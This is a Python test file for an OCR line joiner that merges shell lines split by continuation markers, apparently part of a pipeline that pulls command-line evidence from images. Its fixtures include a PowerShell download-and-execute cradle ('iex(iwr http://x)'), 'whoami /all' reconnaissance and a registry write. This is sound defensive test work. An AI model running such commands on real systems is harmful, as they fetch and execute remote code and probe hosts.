"""
P0.15C-4 · OCR Line Joiner · release-gate tests

Contract locked by these tests:
    · Deterministic — same input yields byte-identical output.
    · Pure — never mutates the caller's OCRResult.
    · Only explicit shell continuation markers (\\ ^ ` |) trigger joins.
    · Merged bbox = union · confidence = min (per contract §2.4).
    · ``joined_from_lines`` provenance surfaces IFF joining ran.
    · Line-joining runs BEFORE the evidence extractor
      (verified by extract_from_image plumbing).
"""
from __future__ import annotations

import copy
from services.veee.ocr_engine  import OCRResult, OCRLine, OCRBBox
from services.veee.line_joiner import join_lines
from services.veee.evidence_extractor import extract_evidence


def _line(text, x=0, y=0, w=100, h=20, conf=0.9):
    return OCRLine(text=text, words=[],
                       bbox=OCRBBox(x=x, y=y, w=w, h=h),
                       confidence=conf)


def _ocr(lines, mean=0.9):
    return OCRResult(text="\n".join(l.text for l in lines),
                          lines=lines, mean_confidence=mean,
                          engine="tesseract-5")


# ══════════════════════════════════════════════════════════════════
# Basic joining behavior
# ══════════════════════════════════════════════════════════════════
def test_no_join_when_no_continuation_chars():
    src = _ocr([_line("powershell.exe -c iex"),
                    _line("whoami /all")])
    out = join_lines(src)
    assert out.text == "powershell.exe -c iex\nwhoami /all"
    assert len(out.lines) == 2
    # No line carries joined_from_lines.
    for ln in out.lines:
        assert ln.joined_from_lines == []


def test_join_on_backslash_continuation():
    src = _ocr([_line("powershell.exe -c \\", y=0),
                    _line("iex(iwr http://x)", y=25)])
    out = join_lines(src)
    assert len(out.lines) == 1
    merged = out.lines[0]
    assert merged.text == "powershell.exe -c iex(iwr http://x)"
    assert merged.joined_from_lines == [0, 1]


def test_join_on_powershell_backtick():
    src = _ocr([_line("Get-Process `"),
                    _line("| Select Name")])
    out = join_lines(src)
    assert len(out.lines) == 1
    assert out.lines[0].text == "Get-Process | Select Name"


def test_join_on_cmd_caret():
    src = _ocr([_line("reg add HKLM\\Software\\X /v foo ^"),
                    _line("/d bar /f")])
    out = join_lines(src)
    assert len(out.lines) == 1
    assert out.lines[0].text == "reg add HKLM\\Software\\X /v foo /d bar /f"


def test_join_on_pipe():
    src = _ocr([_line("Get-WmiObject Win32_Process |"),
                    _line("Where-Object Name -eq 'x'")])
    out = join_lines(src)
    assert len(out.lines) == 1
    assert out.lines[0].text == "Get-WmiObject Win32_Process Where-Object Name -eq 'x'"


def test_chain_of_three_joined_lines():
    src = _ocr([_line("cmd.exe /c \\"),
                    _line("echo hi \\"),
                    _line("&& whoami")])
    out = join_lines(src)
    assert len(out.lines) == 1
    assert out.lines[0].joined_from_lines == [0, 1, 2]
    assert "cmd.exe /c" in out.lines[0].text
    assert "whoami" in out.lines[0].text


# ══════════════════════════════════════════════════════════════════
# Bounding box + confidence semantics
# ══════════════════════════════════════════════════════════════════
def test_merged_bbox_is_union():
    src = _ocr([_line("a \\", x=10, y=100, w=50,  h=20),
                    _line("b",   x=20, y=125, w=100, h=22)])
    out = join_lines(src)
    b = out.lines[0].bbox
    # union: x=10, y=100, x2=max(60,120)=120, y2=max(120,147)=147
    assert (b.x, b.y, b.w, b.h) == (10, 100, 110, 47)


def test_merged_confidence_is_min():
    src = _ocr([_line("a \\", conf=0.95),
                    _line("b",  conf=0.42)])
    out = join_lines(src)
    assert out.lines[0].confidence == 0.42


# ══════════════════════════════════════════════════════════════════
# Purity + determinism
# ══════════════════════════════════════════════════════════════════
def test_join_lines_is_pure_no_side_effects_on_input():
    src = _ocr([_line("a \\"), _line("b")])
    snapshot = copy.deepcopy(src)
    _ = join_lines(src)
    # Input untouched.
    assert src.text  == snapshot.text
    assert len(src.lines) == 2
    for i in range(2):
        assert src.lines[i].text == snapshot.lines[i].text


def test_join_lines_deterministic_across_repeated_runs():
    src = _ocr([_line("a \\"), _line("b"),
                    _line("c ^"), _line("d")])
    a = join_lines(src)
    b = join_lines(src)
    assert a.text == b.text
    assert [ln.text for ln in a.lines] == [ln.text for ln in b.lines]
    assert [ln.joined_from_lines for ln in a.lines] \
           == [ln.joined_from_lines for ln in b.lines]


# ══════════════════════════════════════════════════════════════════
# Edge cases (§0.2 tolerance rule)
# ══════════════════════════════════════════════════════════════════
def test_empty_ocr_returns_input_unchanged():
    src = _ocr([])
    out = join_lines(src)
    assert out is src or out.lines == []


def test_single_line_never_triggers_join():
    src = _ocr([_line("whoami /all")])
    out = join_lines(src)
    assert out is src
    assert out.lines[0].joined_from_lines == []


def test_dangling_continuation_at_end_of_input_absorbs_nothing():
    # The last line ends with `\` but there's nothing to join.
    src = _ocr([_line("a"), _line("b \\")])
    out = join_lines(src)
    # 'a' passes through; 'b \\' has nothing to absorb, stays as-is.
    assert len(out.lines) == 2
    assert out.lines[1].text == "b \\"
    assert out.lines[1].joined_from_lines == []


# ══════════════════════════════════════════════════════════════════
# Provenance propagation into evidence_extractor
# ══════════════════════════════════════════════════════════════════
def test_evidence_extractor_emits_joined_from_lines_on_provenance():
    src = _ocr([_line("powershell.exe -c \\", conf=0.9),
                    _line("iex(iwr http://x)",   conf=0.85)])
    joined = join_lines(src)
    records = extract_evidence(joined, image_url="https://x/img.png")
    # First record is the joined commandline.
    cmd_rec = [r for r in records if r["type"] == "commandline"][0]
    assert cmd_rec["provenance"]["joined_from_lines"] == [0, 1]
    # bbox present, confidence is the min of the two.
    assert cmd_rec["provenance"]["bounding_box"]
    assert cmd_rec["provenance"]["ocr_confidence"] == round(0.85, 3)


def test_evidence_extractor_omits_joined_from_lines_when_not_joined():
    src = _ocr([_line("whoami /all")])
    records = extract_evidence(src, image_url="https://x/img.png")
    for r in records:
        assert "joined_from_lines" not in r["provenance"]
